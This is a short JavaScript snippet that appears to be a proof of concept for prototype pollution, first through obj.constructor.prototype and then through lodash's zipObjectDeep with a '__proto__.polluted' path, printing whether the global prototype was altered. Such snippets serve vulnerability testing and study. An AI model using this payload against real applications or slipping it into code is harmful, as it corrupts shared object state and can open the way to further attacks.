var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const _ = require('lodash');
_.zipObjectDeep(['__proto__.polluted'], ['yes']);
console.log({}.polluted);